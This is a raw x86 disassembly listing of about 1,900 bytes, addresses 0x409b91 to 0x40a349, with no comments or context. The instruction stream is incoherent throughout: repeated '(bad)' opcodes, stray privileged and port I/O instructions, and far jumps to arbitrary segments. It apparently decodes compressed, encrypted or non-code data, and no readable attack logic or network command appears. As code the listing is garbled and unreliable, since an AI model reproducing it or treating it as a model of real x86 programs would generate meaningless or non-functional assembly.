  409b91:	xor    bh,BYTE PTR [edi-0x3d62418b]
  409b97:	push   ecx
  409b98:	pop    ecx
  409b99:	jmp    0xf63d57ef
  409b9e:	or     DWORD PTR [edi],0xffffffd8
  409ba1:	adc    BYTE PTR [ebx],bh
  409ba3:	imul   edx,DWORD PTR [ebx+0x55743587],0x28
  409baa:	bnd jns 0x409bae
  409bad:	inc    esi
  409bae:	dec    edi
  409baf:	pop    esi
  409bb0:	int3   
  409bb1:	dec    esp
  409bb2:	mov    ebp,0x84934c36
  409bb7:	cmp    ecx,DWORD PTR [esi+0x12416f89]
  409bbd:	pop    edx
  409bbe:	add    eax,0xb16bcb54
  409bc3:	add    al,0x41
  409bc5:	es xchg ecx,eax
  409bc7:	mov    bl,0x7e
  409bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bca:	dec    ecx
  409bcb:	dec    DWORD PTR [ebx+ebp*2+0x73]
  409bcf:	sar    DWORD PTR [edi+0x7dccbaf3],cl
  409bd5:	popf   
  409bd6:	or     BYTE PTR [ebx+ebp*4-0x62],ch
  409bda:	test   DWORD PTR ds:0xd1e04e13,eax
  409be0:	xor    BYTE PTR [ecx-0x75],dl
  409be3:	xor    DWORD PTR [esp+edx*4],ebx
  409be6:	push   ss
  409be7:	(bad)  
  409be9:	es jno 0x409b80
  409bec:	cmc    
  409bed:	mov    ebx,0xb8303523
  409bf2:	leave  
  409bf3:	mov    eax,0xbdd15824
  409bf8:	dec    esp
  409bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bfa:	sbb    eax,0x47f2fd2f
  409bff:	imul   ebx,DWORD PTR [edx+0x3e],0xa15e25a5
  409c06:	sbb    BYTE PTR [ebx],0x74
  409c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c0a:	imul   al
  409c0c:	int    0x41
  409c0e:	mov    ds:0x129631a,eax
  409c13:	and    edi,DWORD PTR [edi-0x47e3ca01]
  409c19:	push   ebp
  409c1a:	scas   eax,DWORD PTR es:[edi]
  409c1b:	shl    ebx,cl
  409c1d:	inc    edx
  409c1e:	push   edx
  409c1f:	retf   
  409c20:	fld    QWORD PTR [ecx+0x50]
  409c23:	out    0x4,al
  409c25:	add    edx,DWORD PTR [edi+0x7da26a5a]
  409c2b:	cmp    DWORD PTR [edx+0x68],eax
  409c2e:	sbb    eax,0xf832394b
  409c33:	jbe    0x409be5
  409c35:	jo     0x409bbd
  409c37:	push   0x16b59110
  409c3c:	mov    ah,BYTE PTR ds:0xacec27e2
  409c42:	imul   DWORD PTR [ebx]
  409c44:	dec    esi
  409c45:	push   ds
  409c46:	in     al,0xfe
  409c48:	xor    eax,0x70022a0c
  409c4d:	mov    bl,0x69
  409c4f:	bnd ret 0x1b3d
  409c53:	jl     0x409c45
  409c55:	and    DWORD PTR [edx+0x65e3f6e5],ecx
  409c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c5d:	xlat   BYTE PTR ds:[ebx]
  409c5e:	mov    eax,esi
  409c60:	mov    ebp,0xff373c70
  409c65:	add    DWORD PTR [ebx+0x58a167dc],ebp
  409c6b:	push   ebx
  409c6c:	cmp    dl,bl
  409c6e:	stos   BYTE PTR es:[edi],al
  409c6f:	xor    al,0xe2
  409c71:	out    dx,eax
  409c72:	sbb    ecx,DWORD PTR [ebx]
  409c74:	retf   0xc7a1
  409c77:	iret   
  409c78:	pop    ds
  409c79:	sub    bl,BYTE PTR [esi-0x5b]
  409c7c:	push   0x2acc8704
  409c81:	mov    es,eax
  409c83:	leave  
  409c84:	push   cs
  409c85:	das    
  409c86:	jbe    0x409cc1
  409c88:	enter  0x4e57,0xf8
  409c8c:	sahf   
  409c8d:	mov    edi,0xbe44a244
  409c92:	cmp    edx,DWORD PTR [esi-0x2]
  409c95:	and    BYTE PTR ds:0x7c401188,bl
  409c9b:	fdivrp st(4),st
  409c9d:	daa    
  409c9e:	inc    esi
  409c9f:	je     0x409d17
  409ca1:	jno    0x409c4b
  409ca3:	push   edi
  409ca4:	mov    ebp,0xf87c5acc
  409ca9:	fwait
  409caa:	adc    eax,0xc35f1803
  409caf:	add    DWORD PTR [eax-0x41],edi
  409cb2:	add    DWORD PTR [ecx+0x1f],edi
  409cb5:	push   ebx
  409cb6:	rcr    BYTE PTR [eax-0xb13a74e],0x8e
  409cbd:	adc    DWORD PTR [edi+0x5c],edx
  409cc0:	inc    esp
  409cc1:	add    ah,BYTE PTR [ecx+0x67504025]
  409cc7:	jns    0x409c77
  409cc9:	jmp    0x409d4a
  409ccb:	leave  
  409ccc:	(bad)  
  409cce:	cmp    ch,BYTE PTR [edi-0x25888606]
  409cd4:	ror    BYTE PTR [eax+0x78],0x6
  409cd8:	sbb    edx,esp
  409cda:	(bad)  
  409cdb:	into   
  409cdc:	or     BYTE PTR [edi],bh
  409cde:	sub    al,0x16
  409ce0:	aas    
  409ce1:	mov    edx,0xbc1d18a
  409ce6:	or     edi,DWORD PTR [eax-0x4c]
  409ce9:	sar    ah,0x96
  409cec:	pusha  
  409ced:	inc    eax
  409cee:	pop    edi
  409cef:	idiv   BYTE PTR [esi]
  409cf1:	mov    eax,0x519e6dc2
  409cf6:	int3   
  409cf7:	pop    ds
  409cf8:	lds    edi,FWORD PTR [edx+0x34]
  409cfb:	dec    ecx
  409cfc:	adc    dl,BYTE PTR [eax-0x7a]
  409cff:	dec    ebx
  409d00:	mov    al,ds:0x988e3306
  409d05:	ret    0xa6b8
  409d08:	cmp    eax,0xce681c1f
  409d0d:	fwait
  409d0e:	cmp    al,0xd4
  409d10:	fstp   st(5)
  409d12:	inc    eax
  409d13:	adc    BYTE PTR [ebp-0x28],dh
  409d16:	ret    0xaaf0
  409d19:	push   ds
  409d1a:	stc    
  409d1b:	adc    ah,BYTE PTR ss:[esp+ecx*1+0xd]
  409d20:	outs   dx,BYTE PTR ds:[esi]
  409d21:	and    BYTE PTR [eax+0x11],dl
  409d24:	daa    
  409d25:	inc    esi
  409d26:	inc    BYTE PTR [ecx-0x70]
  409d29:	xor    BYTE PTR [esi+0x73],0xa3
  409d2d:	xchg   edx,eax
  409d2e:	jp     0x409d36
  409d30:	in     eax,0xbd
  409d32:	pop    esp
  409d33:	call   0x2ed15cd2
  409d38:	mov    ebx,0xdc144b6b
  409d3d:	sbb    eax,0x7c0dc298
  409d42:	dec    eax
  409d43:	mov    ecx,eax
  409d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d46:	xchg   ecx,eax
  409d47:	xchg   esi,eax
  409d48:	cmp    al,0x32
  409d4a:	jns    0x409d2d
  409d4c:	push   eax
  409d4d:	shl    BYTE PTR [edi],0x49
  409d50:	xchg   edx,eax
  409d51:	xor    dl,BYTE PTR [edx]
  409d53:	aad    0x12
  409d55:	lock sub BYTE PTR [ecx-0x23e2aaf3],al
  409d5c:	in     al,0xfc
  409d5e:	push   0x6c145a20
  409d63:	cmp    al,0x71
  409d65:	mov    dh,0x56
  409d67:	or     eax,0xe54dd27e
  409d6c:	retf   
  409d6d:	push   ebp
  409d6e:	cmp    ecx,ecx
  409d70:	push   ebx
  409d71:	or     eax,0x24ea061f
  409d76:	jmp    0x674a:0x26dd081
  409d7d:	dec    DWORD PTR [ecx+0x3e]
  409d80:	les    eax,FWORD PTR [ebp-0x18]
  409d83:	es xor eax,0x8475038c
  409d89:	xor    BYTE PTR [esi],bh
  409d8b:	dec    esi
  409d8c:	bound  ebx,QWORD PTR [ebp-0x79]
  409d8f:	daa    
  409d90:	mov    WORD PTR [edx],fs
  409d92:	push   ss
  409d93:	cmp    eax,esi
  409d95:	mov    DWORD PTR [ebx-0x57d3efca],0xe81e3812
  409d9f:	shr    BYTE PTR [edx+esi*2-0x1fa221f5],cl
  409da6:	dec    ebx
  409da7:	pop    esi
  409da8:	push   es
  409da9:	hlt    
  409daa:	xor    eax,0x9027e332
  409daf:	call   0x5b81:0xdd255a81
  409db6:	adc    BYTE PTR [edi*1+0x24c74bab],0x5e
  409dbe:	or     dh,cl
  409dc0:	in     al,0xd8
  409dc2:	and    DWORD PTR [eax+0x38],0xffffffd3
  409dc6:	daa    
  409dc7:	stos   BYTE PTR es:[edi],al
  409dc8:	out    0x83,al
  409dca:	adc    eax,0x485d115c
  409dcf:	es (bad) 
  409dd1:	pop    ecx
  409dd2:	push   cs
  409dd3:	add    al,0x1f
  409dd5:	(bad)  
  409dd6:	jb     0x409dc9
  409dd8:	pop    ds
  409dd9:	pop    eax
  409dda:	cs inc esp
  409ddc:	pop    ebx
  409ddd:	mov    ss,edx
  409ddf:	cli    
  409de0:	jp     0x409e3b
  409de2:	ja     0x409d93
  409de4:	xchg   ebx,esp
  409de6:	push   ebp
  409de7:	mov    dl,BYTE PTR [esi+0x6ca799b0]
  409ded:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  409def:	push   ds
  409df0:	cmp    DWORD PTR [eax+esi*4],ecx
  409df3:	in     al,dx
  409df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409df5:	retf   
  409df6:	push   es
  409df7:	push   esi
  409df8:	enter  0xfe4a,0x4f
  409dfc:	mov    ebp,0xbba6ca5f
  409e01:	adc    eax,0x5fb7d820
  409e06:	daa    
  409e07:	pushf  
  409e08:	xchg   esp,eax
  409e09:	push   ecx
  409e0a:	mov    ch,bh
  409e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e0d:	imul   esp,DWORD PTR [ebp-0x69f95e4f],0xa8d6af4f
  409e17:	add    esp,esp
  409e19:	(bad)  
  409e1a:	mov    eax,0xde4cec0b
  409e1f:	or     al,0xc
  409e21:	mov    edi,DWORD PTR [eax-0x770d75f4]
  409e27:	ret    
  409e28:	ror    edi,0xd5
  409e2b:	or     cl,0xb5
  409e2e:	xchg   BYTE PTR [eax],al
  409e30:	out    0xfe,eax
  409e32:	sub    ebx,eax
  409e34:	pop    ecx
  409e35:	loopne 0x409e38
  409e37:	xchg   ebp,eax
  409e38:	dec    edi
  409e39:	adc    BYTE PTR [edx+edi*2+0x1d],dl
  409e3d:	fidivr DWORD PTR [edi+edi*1+0x30fbb92d]
  409e44:	inc    ebx
  409e45:	pop    ecx
  409e46:	and    DWORD PTR [ecx],ebp
  409e48:	or     edx,DWORD PTR [ebp-0x7c]
  409e4b:	and    DWORD PTR [edx+0xc],eax
  409e4e:	mov    cl,0x22
  409e50:	gs cmp al,0xa2
  409e53:	in     al,dx
  409e54:	xor    BYTE PTR ds:0x965fa9fe,dl
  409e5a:	dec    eax
  409e5b:	adc    al,0x6a
  409e5d:	push   ss
  409e5e:	loop   0x409e78
  409e60:	sbb    ecx,DWORD PTR [ecx-0x16]
  409e63:	push   edx
  409e64:	hlt    
  409e65:	stos   DWORD PTR es:[edi],eax
  409e66:	and    edx,ecx
  409e68:	jle    0x409eb5
  409e6a:	or     DWORD PTR [edx],ebp
  409e6c:	test   BYTE PTR [esi+eiz*1],0xf6
  409e70:	inc    esi
  409e71:	arpl   WORD PTR [esi-0x46],di
  409e74:	mov    esi,0x23b9129a
  409e79:	pop    ss
  409e7a:	std    
  409e7b:	and    esp,0xed30d72b
  409e81:	xor    eax,0x667ebd0d
  409e86:	cmc    
  409e87:	xor    ch,bl
  409e89:	icebp  
  409e8a:	rcr    DWORD PTR [eax],cl
  409e8c:	cdq    
  409e8d:	add    al,0x75
  409e8f:	xor    al,0xc3
  409e91:	xchg   ebx,eax
  409e92:	ins    DWORD PTR es:[edi],dx
  409e93:	or     BYTE PTR [ebp+0x5b483d7],al
  409e99:	fst    DWORD PTR [esi+0x76]
  409e9c:	nop
  409e9d:	jge    0x409f12
  409e9f:	inc    eax
  409ea0:	mov    edi,0xb6bff35f
  409ea5:	ja     0x409e28
  409ea7:	adc    edi,ecx
  409ea9:	jp     0x409ecd
  409eab:	daa    
  409eac:	out    0xaf,eax
  409eae:	jno    0x409e6f
  409eb0:	push   esp
  409eb1:	out    0x6a,eax
  409eb3:	adc    DWORD PTR [esi+0x7a],edx
  409eb6:	out    0x7a,eax
  409eb8:	scas   eax,DWORD PTR es:[edi]
  409eb9:	sub    DWORD PTR [eax],ebx
  409ebb:	inc    edx
  409ebc:	(bad)  
  409ebd:	(bad)  
  409ebe:	pop    edi
  409ebf:	pop    ebp
  409ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ec1:	xchg   edi,eax
  409ec2:	xchg   edi,eax
  409ec3:	inc    eax
  409ec4:	push   ds
  409ec5:	aad    0x1c
  409ec7:	pop    edi
  409ec8:	or     al,0x35
  409eca:	push   ecx
  409ecb:	push   ebp
  409ecc:	repnz leave 
  409ece:	add    dl,0xdb
  409ed1:	or     BYTE PTR [esi+0x511ed888],0x34
  409ed8:	push   0xcb09ae09
  409edd:	pop    ss
  409ede:	jno    0x409e85
  409ee0:	paddusb mm1,QWORD PTR [ebx+0x4c888e9b]
  409ee7:	ret    0x52fd
  409eea:	or     BYTE PTR [edx],dl
  409eec:	popa   
  409eed:	inc    ebx
  409eee:	mov    esp,0x36ed3b22
  409ef3:	sub    ebx,ecx
  409ef5:	push   0xffffffa8
  409ef7:	sbb    eax,0xa036469
  409efc:	int3   
  409efd:	(bad)  
  409eff:	call   0xe389a308
  409f04:	xchg   esp,edi
  409f06:	int3   
  409f07:	loop   0x409eb0
  409f09:	push   ebp
  409f0a:	push   cs
  409f0b:	fcomp  QWORD PTR [ebx]
  409f0d:	xchg   esi,eax
  409f0e:	mov    bh,0xee
  409f10:	jne    0x409ef1
  409f12:	push   esp
  409f13:	sbb    al,0x31
  409f15:	mov    cs,WORD PTR [esi]
  409f17:	jg     0x409f65
  409f19:	push   0x90957f48
  409f1e:	leave  
  409f1f:	sub    esi,edx
  409f21:	and    esp,ebp
  409f23:	push   ds
  409f24:	sbb    eax,0xee649049
  409f29:	scas   eax,DWORD PTR es:[edi]
  409f2a:	scas   eax,DWORD PTR es:[edi]
  409f2b:	jae    0x409eef
  409f2d:	(bad)  
  409f2e:	mov    ah,0x42
  409f30:	mov    edi,0xbb5f8d74
  409f35:	in     al,0xb4
  409f37:	cmp    DWORD PTR [ebp-0x27],edi
  409f3a:	inc    esi
  409f3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f3c:	popa   
  409f3d:	pop    edi
  409f3e:	adc    bl,BYTE PTR [edi-0x47]
  409f41:	icebp  
  409f42:	mov    gs,WORD PTR [edx-0x2be1ef81]
  409f48:	lahf   
  409f49:	jmp    DWORD PTR [ecx+0x51]
  409f4c:	dec    ebx
  409f4d:	lds    ebp,FWORD PTR [edi+eax*8]
  409f50:	(bad)  
  409f52:	adc    cl,dl
  409f54:	push   edi
  409f55:	test   BYTE PTR [esi-0x65],dl
  409f58:	mov    ds:0x847b29d4,eax
  409f5d:	sub    bh,ah
  409f5f:	leave  
  409f60:	cmp    bh,cl
  409f62:	into   
  409f63:	dec    esi
  409f64:	push   ds
  409f65:	mov    ebx,0xefb8db71
  409f6a:	push   esi
  409f6b:	jnp    0x409f92
  409f6d:	dec    DWORD PTR [edi+edx*4-0x53]
  409f71:	mov    bh,0xed
  409f73:	into   
  409f74:	ror    cl,0xc
  409f77:	bound  ecx,QWORD PTR [edi+0x3a0e03d]
  409f7d:	jl     0x409fd2
  409f7f:	mov    ah,0xf8
  409f81:	add    BYTE PTR [eax+eiz*8-0xe],0xd9
  409f86:	and    edi,ebx
  409f88:	dec    eax
  409f89:	(bad)  
  409f8a:	cmp    DWORD PTR [eax+0x3b],eax
  409f8d:	xor    al,0x71
  409f8f:	aad    0x47
  409f91:	fcmovb st,st(4)
  409f93:	xchg   esi,eax
  409f94:	call   0x49fe07dd
  409f99:	in     eax,dx
  409f9a:	jne    0x409f65
  409f9c:	mov    ss,WORD PTR [eax+0x478dd48f]
  409fa2:	repz push ecx
  409fa4:	jmp    0xe98d:0x63554e0c
  409fab:	mov    ds:0xf7627e07,eax
  409fb0:	sbb    eax,0x92fa1936
  409fb5:	pop    es
  409fb6:	xor    DWORD PTR [ebp+0x360c84e0],0x1dd8539e
  409fc0:	adc    esi,eax
  409fc2:	mov    ebp,0xdd6cbdf9
  409fc7:	xchg   DWORD PTR [ebx-0x5f2b78cb],ebp
  409fcd:	xor    ebx,edx
  409fcf:	js     0x409ffd
  409fd1:	call   0x2adf0d00
  409fd6:	das    
  409fd7:	dec    ebp
  409fd8:	xchg   DWORD PTR [eax-0x3d],esp
  409fdb:	dec    esi
  409fdc:	sub    al,0x32
  409fde:	aad    0x77
  409fe0:	fst    DWORD PTR [ebp+0x69]
  409fe3:	add    BYTE PTR [ebx-0x71ceff01],dl
  409fe9:	dec    eax
  409fea:	ja     0x40a04f
  409fec:	jb     0x40a01b
  409fee:	mov    bl,BYTE PTR [esi]
  409ff0:	inc    ecx
  409ff1:	sbb    DWORD PTR [ecx],0xfaee3f44
  409ff7:	and    esi,0x32
  409ffa:	sar    BYTE PTR [eax],1
  409ffc:	xor    BYTE PTR [edx+0x5c],bh
  409fff:	je     0x409fca
  40a001:	add    DWORD PTR [ebx],0xffffffbf
  40a004:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a006:	mov    ebx,0x1870b2f9
  40a00b:	jg     0x409fe4
  40a00d:	hlt    
  40a00e:	xchg   ecx,eax
  40a00f:	stc    
  40a010:	ret    
  40a011:	xchg   esi,eax
  40a012:	lea    esi,[edi+0x23]
  40a015:	push   es
  40a016:	mov    BYTE PTR [ebx],dh
  40a018:	xchg   DWORD PTR [edi-0x77],esp
  40a01b:	xor    DWORD PTR [edx],ebx
  40a01d:	jae    0x40a095
  40a01f:	and    DWORD PTR [esi+eax*1],0xffffffd0
  40a023:	mov    ah,0x63
  40a025:	(bad)  
  40a026:	lock cmp dh,al
  40a029:	sbb    DWORD PTR [ebp-0x47],esi
  40a02c:	xchg   ebx,eax
  40a02d:	mov    WORD PTR [eax],fs
  40a02f:	out    0xf2,eax
  40a031:	push   esp
  40a032:	test   BYTE PTR [esi-0x7e88bf46],0x2a
  40a039:	jmp    0x40a0b8
  40a03b:	xor    ah,dl
  40a03d:	imul   edx,DWORD PTR [eax+0x202081f2],0x3a
  40a044:	out    0x50,al
  40a046:	pop    ebx
  40a047:	pop    ds
  40a048:	clc    
  40a049:	jno    0x40a085
  40a04b:	not    BYTE PTR [esi+0x72bdb3c8]
  40a051:	jb     0x40a048
  40a053:	fisubr DWORD PTR [ecx]
  40a055:	mov    edi,0xabb225f9
  40a05a:	push   ds
  40a05b:	cmp    dl,BYTE PTR [eax+0x6]
  40a05e:	sub    eax,0x2af16e34
  40a063:	xor    BYTE PTR [esi+0x3321d007],dh
  40a069:	jmp    0x74902148
  40a06e:	xchg   ecx,eax
  40a06f:	xchg   ebp,eax
  40a070:	mov    bl,0x4
  40a072:	and    BYTE PTR [eax+0x795121b9],dh
  40a078:	mov    ecx,0xfed0c581
  40a07d:	jo     0x40a0f7
  40a07f:	ret    
  40a080:	pop    ss
  40a081:	stos   DWORD PTR es:[edi],eax
  40a082:	inc    edi
  40a083:	cmp    al,0xe7
  40a085:	scas   al,BYTE PTR es:[edi]
  40a086:	or     ah,BYTE PTR [si-0x14]
  40a08a:	mov    eax,0x43fa9314
  40a08f:	sub    eax,0xc7adbbb4
  40a094:	dec    ebp
  40a095:	lds    esi,FWORD PTR [edx]
  40a097:	or     esi,DWORD PTR [esi+0x28]
  40a09a:	ins    DWORD PTR es:[edi],dx
  40a09b:	push   cs
  40a09c:	mov    bl,bl
  40a09e:	xor    dh,dh
  40a0a0:	(bad)  
  40a0a1:	rcl    ah,0xfc
  40a0a4:	js     0x40a06e
  40a0a6:	imul   esi
  40a0a8:	test   eax,0x60308fa6
  40a0ad:	mov    ebx,0x5b5bf10a
  40a0b2:	pop    ebx
  40a0b3:	out    0xf1,eax
  40a0b5:	ins    BYTE PTR es:[edi],dx
  40a0b6:	lahf   
  40a0b7:	mov    ecx,0xdc071cea
  40a0bc:	lea    esp,[ebx+0x4ad3ac44]
  40a0c2:	and    eax,0x4f2ed72d
  40a0c7:	xor    DWORD PTR [edx+0x2b],esp
  40a0ca:	inc    eax
  40a0cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0cc:	(bad)  
  40a0cd:	xor    DWORD PTR [ebx-0x6c],ecx
  40a0d0:	(bad)
  40a0d3:	xchg   ecx,eax
  40a0d4:	xchg   DWORD PTR [eax+0x71],ecx
  40a0d7:	xchg   esi,eax
  40a0d8:	lea    ebx,[esi-0x49c0f6f5]
  40a0de:	mov    gs,ebx
  40a0e0:	enter  0xdf12,0xfb
  40a0e4:	cdq    
  40a0e5:	fdiv   QWORD PTR [ebx+0x7b7c0286]
  40a0eb:	pop    ds
  40a0ec:	outs   dx,BYTE PTR ds:[esi]
  40a0ed:	mov    dl,0x1c
  40a0ef:	mov    eax,ds:0x79c8b37e
  40a0f4:	inc    ebx
  40a0f5:	mov    ebp,DWORD PTR [edx-0x78]
  40a0f8:	lahf   
  40a0f9:	push   edx
  40a0fa:	stos   BYTE PTR es:[edi],al
  40a0fb:	out    0x94,eax
  40a0fd:	inc    edi
  40a0fe:	push   0xffffffb9
  40a100:	fst    QWORD PTR [edi+0x3b003bee]
  40a106:	mov    ebp,DWORD PTR ds:0xf20fc3f6
  40a10c:	mov    ah,0x9f
  40a10e:	daa    
  40a10f:	gs ret 
  40a111:	or     DWORD PTR [ecx-0x75],ecx
  40a114:	add    al,0xd5
  40a116:	fimul  WORD PTR [ecx-0x7661226]
  40a11c:	mov    cl,0x24
  40a11e:	mov    eax,DWORD PTR cs:[ebx]
  40a121:	adc    eax,0xaa80e92d
  40a126:	xor    bh,cl
  40a128:	or     DWORD PTR [edi-0x6e],ebp
  40a12b:	ins    DWORD PTR es:[edi],dx
  40a12c:	clc    
  40a12d:	sbb    al,0xcb
  40a12f:	lds    edx,FWORD PTR [edx-0x4f]
  40a132:	push   edi
  40a133:	pop    ds
  40a134:	pusha  
  40a135:	lahf   
  40a136:	in     al,dx
  40a137:	imul   ecx,DWORD PTR [eax+0x70],0x21
  40a13b:	pop    eax
  40a13c:	retf   
  40a13d:	loope  0x40a1ae
  40a13f:	fcomp  st(5)
  40a141:	cmp    ch,ah
  40a143:	sub    eax,0x2c5b4889
  40a148:	sbb    cl,BYTE PTR [ebp+0x50]
  40a14b:	pop    es
  40a14c:	ja     0x40a117
  40a14e:	jb     0x40a128
  40a150:	inc    edx
  40a151:	call   0x7b81a114
  40a156:	ret    
  40a157:	fmul   QWORD PTR [ebx-0x5a]
  40a15a:	test   eax,0x5873d831
  40a15f:	fwait
  40a160:	and    edi,edx
  40a162:	mov    DWORD PTR [esi],esi
  40a164:	pop    esi
  40a165:	aas    
  40a166:	mov    ebp,0x8fb7d88a
  40a16b:	xor    al,0x35
  40a16d:	call   0x67b3:0xa2639c9c
  40a174:	adc    DWORD PTR [ebp+0x3330554e],edx
  40a17a:	cdq    
  40a17b:	arpl   bx,dx
  40a17d:	call   0xaa2543a2
  40a182:	call   0x14bf9be8
  40a187:	jg     0x40a1b2
  40a189:	xchg   esi,eax
  40a18a:	xchg   edx,eax
  40a18b:	stos   DWORD PTR es:[edi],eax
  40a18c:	pop    edi
  40a18d:	jbe    0x40a15a
  40a18f:	xchg   ebp,eax
  40a190:	adc    BYTE PTR ds:0x425dedbc,dh
  40a196:	adc    BYTE PTR [ecx-0x35],al
  40a199:	out    dx,eax
  40a19a:	out    dx,eax
  40a19b:	push   cs
  40a19c:	dec    eax
  40a19d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a19e:	popa   
  40a19f:	out    0xb,eax
  40a1a1:	stos   BYTE PTR es:[edi],al
  40a1a2:	adc    esi,DWORD PTR ds:0x3355d45
  40a1a8:	cmp    eax,0x851ada95
  40a1ad:	and    cl,bl
  40a1af:	push   cs
  40a1b0:	ja     0x40a213
  40a1b2:	jp     0x40a21a
  40a1b4:	das    
  40a1b5:	or     DWORD PTR [edi+0x18],ebx
  40a1b8:	mov    ebx,0x3b1190e4
  40a1bd:	jmp    0x5ca5:0xf6974b6a
  40a1c4:	imul   edx,ebx,0xe8a995bf
  40a1ca:	push   cs
  40a1cb:	cwde   
  40a1cc:	sub    BYTE PTR [ecx],bl
  40a1ce:	popa   
  40a1cf:	das    
  40a1d0:	bound  edi,QWORD PTR [eax+eiz*4]
  40a1d3:	dec    ebp
  40a1d4:	retf   0x6252
  40a1d7:	dec    ebp
  40a1d8:	ficom  WORD PTR [ebx+0x4531946b]
  40a1de:	sub    eax,0x7c9e0c35
  40a1e3:	mov    eax,DWORD PTR [eax]
  40a1e5:	mov    ecx,0xa3a0be21
  40a1ea:	pop    edx
  40a1eb:	jg     0x40a1a8
  40a1ed:	mov    cl,0x5b
  40a1ef:	adc    DWORD PTR [esi+0x7f],edx
  40a1f2:	movups XMMWORD PTR [ecx],xmm5
  40a1f5:	repnz repz in al,0xb1
  40a1f9:	inc    esp
  40a1fa:	push   edi
  40a1fb:	mov    ch,0x15
  40a1fd:	outs   dx,BYTE PTR ds:[esi]
  40a1fe:	push   0xffffffdd
  40a200:	in     al,0x35
  40a202:	mov    eax,ds:0x9e10a9bb
  40a207:	inc    esi
  40a208:	mov    cl,0x6b
  40a20a:	loop   0x40a271
  40a20c:	mul    BYTE PTR [edx-0x54]
  40a20f:	mov    bl,0xf9
  40a211:	in     al,0xa7
  40a213:	xor    al,0x7a
  40a215:	mov    ah,0xa1
  40a217:	ss pop es
  40a219:	rol    ch,0x9c
  40a21c:	xor    eax,0x99a4088c
  40a221:	arpl   WORD PTR [esi+ebp*8+0x6f989d74],si
  40a228:	sub    BYTE PTR [eax],0x43
  40a22b:	fstp   DWORD PTR [ebx+0xad9c571]
  40a231:	jge    0x40a1e0
  40a233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a234:	test   DWORD PTR [ebx],edi
  40a236:	(bad)  
  40a237:	ins    DWORD PTR es:[edi],dx
  40a238:	add    ah,BYTE PTR [esi+0x487fc684]
  40a23e:	in     eax,0x30
  40a240:	call   0xe956c615
  40a245:	mov    al,ds:0xdce70625
  40a24a:	mov    edx,0xc8747f71
  40a24f:	mov    cl,0xe3
  40a251:	jnp    0x40a2af
  40a253:	xor    eax,0xfd18ba2d
  40a258:	adc    eax,DWORD PTR [ecx+0x69]
  40a25b:	or     DWORD PTR [edx-0x28],edi
  40a25e:	retf   0xe0bf
  40a261:	jbe    0x40a2dc
  40a263:	pop    esi
  40a264:	mov    ecx,0x8d2dca5b
  40a269:	mov    dl,BYTE PTR [edi+edi*2-0x23]
  40a26d:	lock sub BYTE PTR es:[edi+0x74b98b98],al
  40a275:	ss into 
  40a277:	nop
  40a278:	jns    0x40a29d
  40a27a:	sub    dh,0x9e
  40a27d:	fild   DWORD PTR [ebx+ecx*8]
  40a280:	jnp    0x40a228
  40a282:	mov    cl,0xe6
  40a284:	mov    al,ds:0xa5f2ae5f
  40a289:	jmp    0x40a20b
  40a28b:	xchg   esp,eax
  40a28c:	jbe    0x40a21c
  40a28e:	bound  ebp,QWORD PTR [ebx+edx*2+0x79d3dd02]
  40a295:	jle    0x40a284
  40a297:	into   
  40a298:	jb     0x40a2bc
  40a29a:	popa   
  40a29b:	frstor [ecx+0x5ad68473]
  40a2a1:	(bad)  
  40a2a3:	ja     0x40a2f1
  40a2a5:	adc    BYTE PTR [edi+0x689a9950],0x49
  40a2ac:	push   edi
  40a2ad:	mov    ebx,0x5eb0939c
  40a2b2:	add    eax,DWORD PTR [eax+0x34]
  40a2b5:	popf   
  40a2b6:	aam    0xf8
  40a2b8:	xchg   edi,eax
  40a2b9:	jl     0x40a241
  40a2bb:	adc    BYTE PTR [edi+edi*2],bl
  40a2be:	xor    BYTE PTR [eax],0x71
  40a2c1:	mul    BYTE PTR [edx-0x70dad0ca]
  40a2c7:	mov    ch,0x40
  40a2c9:	jg     0x40a27f
  40a2cb:	mov    ecx,0xb27393f9
  40a2d0:	sub    ebx,edi
  40a2d2:	into   
  40a2d3:	adc    ecx,edi
  40a2d5:	jmp    0x40a32e
  40a2d7:	pop    ebx
  40a2d8:	pop    es
  40a2d9:	sahf   
  40a2da:	mov    al,BYTE PTR [eax-0x686b4c3a]
  40a2e0:	and    eax,0x54d17cd7
  40a2e5:	sbb    dl,BYTE PTR [ecx-0x14231b6c]
  40a2eb:	mov    cl,0xcf
  40a2ed:	lds    ebx,FWORD PTR [edx+ebp*8+0x22]
  40a2f1:	mov    ds:0x2c19eceb,eax
  40a2f6:	push   esp
  40a2f7:	pop    ebx
  40a2f8:	shr    DWORD PTR [ebp+0x20],0xa2
  40a2fc:	out    dx,eax
  40a2fd:	aam    0x40
  40a2ff:	in     al,0x1e
  40a301:	imul   esp,DWORD PTR [edi-0x460133ad],0x4b61f5b1
  40a30b:	psrad  mm0,QWORD PTR [edx]
  40a30e:	xor    bl,BYTE PTR [esi+0x25992e9c]
  40a314:	js     0x40a393
  40a316:	adc    al,0xe
  40a318:	pop    edx
  40a319:	scas   eax,DWORD PTR es:[edi]
  40a31a:	call   0x94a6117a
  40a31f:	inc    edx
  40a320:	mov    ah,0x44
  40a322:	mov    ds,WORD PTR [edx+ecx*4-0x59a562b1]
  40a329:	and    cl,dl
  40a32b:	loope  0x40a32a
  40a32d:	mov    eax,ecx
  40a32f:	xor    eax,0xcbe2dba3
  40a334:	lods   al,BYTE PTR ds:[esi]
  40a336:	inc    ebp
  40a337:	or     eax,0x824b7984
  40a33c:	xchg   edi,eax
  40a33d:	scas   eax,DWORD PTR es:[edi]
  40a33e:	aaa    
  40a33f:	sbb    ecx,0xffffffc7
  40a342:	enter  0xf23a,0x4e
  40a346:	sub    eax,ecx
  40a348:	push   esp
  40a349:	lahf   
